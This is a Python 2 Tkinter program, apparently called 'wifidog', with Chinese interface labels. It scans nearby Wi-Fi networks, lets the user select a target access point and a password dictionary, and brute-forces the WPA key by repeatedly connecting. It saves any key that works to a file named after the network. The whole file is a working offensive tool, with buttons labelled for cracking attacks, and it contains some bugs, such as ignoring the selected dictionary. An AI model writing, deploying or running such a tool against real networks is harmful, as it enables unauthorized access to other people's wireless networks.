#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2018/4/26 4:23 PM
# @Author  : Steven
# @Contact : 523348709@qq.com
# @Site    : 
# @File    : wifidog.py
# @Software: PyCharm
from tkinter import *
from ttk import Treeview
from pywifi import *
import time
import threading
import tkinter.filedialog


class Watchdog(Frame):
    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.list = []
        self.pack()
        self.createWidgets()

    def createWidgets(self):

        self.info_var = StringVar()
        self.dic_var=StringVar()
        # 表格
        self.tree = Treeview(self, columns=['a', 'b', 'c', 'd', 'e'], show='headings', height=10,selectmode='browse')
        # 内容居中
        self.tree.column("a", width=80, anchor="center")
        self.tree.column("b", width=200, anchor="center")
        self.tree.column("c", width=200, anchor="center")
        self.tree.column("d", width=100, anchor="center")
        self.tree.column("e", width=200, anchor="center")

        # 内容标题
        self.tree.heading('a', text='NO.')
        self.tree.heading('b', text='SSID')
        self.tree.heading('c', text='BSSID')
        self.tree.heading('d', text='SIGNAL')
        self.tree.heading('e', text='ENC/AUTH')
        self.tree.bind('<ButtonRelease-1>',self.selectItem)
        self.tree.pack()

        self.scan_button = Button(self, text='开始扫描', command=self.thread_a)
        self.scan_button.pack()

        self.stop_scan_button = Button(self, text='选择字典文件',command=self.dic_select)
        self.stop_scan_button.pack()

        self.dic_label = Label(self, textvariable=self.dic_var, bg='green')
        self.dic_label.pack()

        self.attack_button = Button(self, text='破解攻击',command=self.attack_wifi)
        self.attack_button.pack()

        self.stop_button = Button(self, text='终止攻击', command=self.break_flag_control)
        self.stop_button.pack()

        self.info_label = Label(self, textvariable=self.info_var, bg='red')
        self.info_label.pack()

    def get_wifi_interface(self):
        # 获取网卡接口
        wifi = PyWiFi()
        if len(wifi.interfaces()) <= 0:
            self.info_var.set( '没有找到wifi网卡')
            exit()
        if len(wifi.interfaces()) == 1:
            self.info_var.set('搜索到网卡设备 %s' % (wifi.interfaces()[0].name()))
            return wifi.interfaces()[0]
        else:
            print '%-4s   %s' % ('No', 'interface name')
            for i, w in enumerate(wifi.interfaces()):
                print '%-4s   %s' % (i, w.name())
            while True:
                iface_no = raw_input('Please choose interface No:')
                no = int(iface_no)
                if no >= 0 and no < len(wifi.interfaces()):
                    return wifi.interfaces()[no]

    def selectItem(self,event):
        #绑定函数
        item = self.tree.focus()
        self.ap_mac= self.tree.item(item)['values'][2]
        print self.ap_mac

    def dic_select(self):
        self.filename = tkinter.filedialog.askopenfilename()
        if self.filename != '':
            self.dic_var.set('选择文件%s'%self.filename)
        else:
            self.dic_var.set("您没有选择任何文件")

    def attack_wifi(self,timeout=10):
        # 读取txt
        result_file = 'result.txt'
        keys = ''
        key_index = 0
        time_former=time.time()
        time_now=time.time()-time_former
        code=-1
        self.break_flag=True
        if self.filename!='':
            with open('top10.txt', 'r')as f:
                keys = f.readlines()
            target=None
            for k,x in self.ap_list.items():
                if x.bssid==self.ap_mac:
                    target=x
                    break
            if target!=None:
                while key_index<len(keys) and self.break_flag:
                    key=keys[key_index]
                    target.key=key.strip()
                    self.dic_var.set('当前正在尝试密码%s'%key.strip())
                    self.iface.disconnect()
                    self.iface.connect(self.iface.add_network_profile(target))
                    while 1:
                        time.sleep(0.1)
                        code=self.iface.status()
                        time_now=time.time()-time_former
                        if time_now>timeout:
                            break
                        if code == const.IFACE_DISCONNECTED:
                            break
                        elif code == const.IFACE_CONNECTED:
                            f=open(x.ssid,'w+')
                            f.write(key)
                            f.close()
                    if code == const.IFACE_DISCONNECTED and time_now < 1:
                        time.sleep(10)
                        continue
                    key_index=key_index+1
                if break_flag:
                    self.info_var.set('密码爆破已经完成')
                else:
                    self.info_var.set('已经终止爆破')
        else:
            self.dic_var.set('请先选择字典再进行后续操作')

    def scan_wifi(self):
        #清空列表
        items=self.tree.get_children()
        for item in items:
            self.tree.delete(item)

        self.iface = self.get_wifi_interface()
        self.ap_list = {}
        # 还需要扫描次数，此处没有
        self.iface.scan()
        time.sleep(5)
        for i, x in enumerate(self.iface.scan_results()):
            ssid = x.ssid
            if len(ssid) == 0:  # hidden ssid
                #ssid = '<length: 0>'
                continue
            elif ssid == '\\x00':  # hidden ssid
                #ssid = '<length: 1>'
                continue
            else:
                if len(x.akm) > 0:  # if len(x.akm)==0 ,the auth is OPEN
                    self.ap_list[x.bssid] = x
            self.tree.insert('', 'end', values=[i + 1, ssid, x.bssid, x.signal, self.get_akm_name(x.akm)])

    def get_akm_name(self, akm_value):
        # 获取加密类型
        akm_name_value = {'NONE': 0, 'UNKNOWN': 5, 'WPA': 1, 'WPA2': 3, 'WPA2PSK': 4, 'WPAPSK': 2}
        akm_names = []
        for a in akm_value:
            for k, v in akm_name_value.items():
                if v == a:
                    akm_names.append(k)
                    break
        if len(akm_names) == 0:
            akm_names.append("OPEN")

        return '/'.join(akm_names)

    def thread_a(self):
        # 线程控制
        t = threading.Thread(target=self.scan_wifi)
        t.start()

    def thread_b(self):
        #线程控制
        t = threading.Thread(target=self.attack_wifi)
        t.start()

    def break_flag_control(self):
        self.break_flag=False


if __name__ == '__main__':
    root = Tk()
    root.wm_attributes('-topmost', 1)
    root.geometry('800x400+30+30')
    dog = Watchdog(master=root)
    dog.mainloop()
